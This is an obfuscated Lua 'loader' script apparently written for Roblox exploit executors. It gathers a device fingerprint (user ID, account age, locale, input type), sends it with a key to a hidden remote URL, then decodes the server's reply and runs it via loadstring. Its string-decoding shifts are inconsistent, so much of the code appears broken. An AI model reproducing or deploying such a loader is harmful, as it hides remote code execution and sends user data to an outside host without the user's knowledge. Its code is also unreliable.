-- CLEAN OBFUSCATED LOADER (Roblox Compatible)
local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z
a=string.byte;b=string.char;c=string.gsub;d=string.sub;e=table.concat;f=table.insert;g=math.floor;h=game.GetService;i=tostring;j=tonumber;k=type;l=pcall;m=warn;n=tick;o=bit32.bxor;p=string.find;q=string.format;r=string.match;s=string.lower;t=game;u=_G;v=shared;w=getfenv;x=loadstring

local function A1(B1,C1)local D1={}for E1=1,#B1 do local F1=B1:byte(E1)if(F1>=48 and F1<=57)or(F1>=65 and F1<=90)or(F1>=97 and F1<=122)then local G1 if F1>=48 and F1<=57 then G1=((F1-48-C1+10)%10)+48 elseif F1>=65 and F1<=90 then G1=((F1-65-C1+26)%26)+65 elseif F1>=97 and F1<=122 then G1=((F1-97-C1+26)%26)+97 end f(D1,b(G1))else f(D1,b(F1))end end return e(D1)end

local H1=...
if k(H1)~=A1("uvtkpi",6)or H1==A1("",3)then H1=u.KEY or v.KEY or(w and w().KEY)end
if not H1 or k(H1)~=A1("uvtkpi",6)or#H1==0 then return end
if not t or not t.GetService then return end

local I1=h(t,A1("Rncagtu",6))
local J1=I1.LocalPlayer
if not J1 then repeat task.wait(0.1)J1=I1.LocalPlayer until J1 end
if not J1.Character then J1.CharacterAdded:Wait()end

local function K1()
local L1={}
f(L1,i(J1.UserId))
f(L1,i(J1.AccountAge))
f(L1,J1.LocaleId or A1("wpmpqyp",8))
local M1=h(t,A1("WugtKprwvUgtxkeg",8))
local N1=A1("wpmpqyp",23)
if M1.TouchEnabled and not M1.KeyboardEnabled then N1=A1("oqjknk",8)
elseif M1.KeyboardEnabled then N1=A1("fguqvqr",25)
elseif M1.GamepadEnabled then N1=A1("eqpuqng",25)end
f(L1,N1)
f(L1,i(g(n()*1000)))
local O1=e(L1,A1("|",2))
local function P1(Q1)local R1=2166136261 for S1=1,#Q1 do R1=o(R1,a(Q1,S1))R1=(R1*16777619)%4294967296 end return q(A1("%08z",2),R1)end
local T1=P1(O1)
local U1=P1(T1..O1)
return T1..A1("-",2)..U1
end

local function V1(W1)
local X1=A1('CDEFGHIJKLMNOPQRSTUVWXYZABCfghijklmnopqrstuvwxyzabcde6789012345+/',20)
W1=c(W1,A1('[^',4)..X1..A1('=]',4),A1('',8))
return(W1:gsub(A1('.',4),function(Y1)if(Y1==A1('=',5))then return A1('',2)end local Z1,A2=A1('',8),(X1:find(Y1)-1)for B2=6,1,-1 do Z1=Z1..(A2%2^B2-A2%2^(B2-1)>0 and A1('7',6)or A1('6',6))end return Z1 end):gsub(A1('%u%u%u?%u?%u?%u?%u?%u?',17),function(Y1)if(#Y1~=8)then return A1('',1)end local C2=0 for B2=1,8 do C2=C2+(Y1:sub(B2,B2)==A1('9',8)and 2^(8-B2)or 0)end return b(C2)end))
end

local function D2(E2,F2)
if not E2 or#E2==0 then return nil end
local G2,H2=l(function()
local I2=h(t,A1("JvvrUgtxkeg",3))
local J2=I2:Base64Decode(E2)
local K2={}
for L2=1,#J2 do
local M2=a(F2,((L2-1)%#F2)+1)
local N2=a(J2,L2)
f(K2,b(o(N2,M2)))
end
return e(K2)
end)
if G2 and H2 then return H2 end
local O2,P2=l(function()
local J2=V1(E2)
local K2={}
for L2=1,#J2 do
local M2=a(F2,((L2-1)%#F2)+1)
local N2=a(J2,L2)
f(K2,b(o(N2,M2)))
end
return e(K2)
end)
return O2 and P2 or nil
end

local function Q2()
local I2=h(t,A1("JvvrUgtxkeg",7))
local R2=A1("jvvru://cvvcejgf-cuugvu-4--mtqmquvgrcpe6.tgrnkv.crr/uetkrvu",3)
local S2=K1()
local T2=A1("24567344dwmj",4)
if not S2 or#S2<16 then m(A1("OVE: Ошибка! Не удалось определить JYKF устройства.",6))return end
local U2=I2:JSONEncode({key=H1,hwid=S2,timestamp=n()})
local V2,W2=l(function()
if syn and syn.request then
local X2=syn.request({Url=R2,Method=A1("RQUV",18),Headers={[A1("Eqpvgpv-Varg",22)]=A1("crrnkecvkqp/lqp",23)},Body=U2})
return X2.Body
elseif request then
local X2=request({Url=R2,Method=A1("RQUV",21),Headers={[A1("Eqpvgpv-Varg",23)]=A1("crrnkecvkqp/lqp",14)},Body=U2})
return X2.Body
elseif http and http.request then
local X2=http.request({Url=R2,Method=A1("RQUV",2),Headers={[A1("Eqpvgpv-Varg",13)]=A1("crrnkecvkqp/lqp",9)},Body=U2})
return X2.Body
else
return I2:PostAsync(R2,U2,Enum.HttpContentType.ApplicationJson)
end
end)
if not V2 then m(A1("OVE: Сервер не отвечает",21))return end
if not W2 or#W2==0 then m(A1("OVE: Сервер не отвечает",14))return end
if d(W2,1,1)==A1("{",9)then m(A1("OVE: Ошибка JYKF",25))return end
local Y2=s(i(W2))
if p(Y2,A1("jykf",10))or p(Y2,A1("okuocvej",20))or p(Y2,A1("kpxcnkf",18))then m(A1("OVE: Ошибка JYKF",9))return end
local Z2
local A3=r(W2,A1("^[C-Bc-d4-5+/=]+$",25))
if A3 then
Z2=D2(W2,T2)
if not Z2 or#Z2==0 then m(A1("OVE: Ошибка JYKF",18))return end
else
Z2=W2
end
local B3=l(function()
local C3=x(Z2)
if C3 then C3()end
end)
if not B3 then m(A1("OVE: Ошибка JYKF",7))end
end

l(Q2)
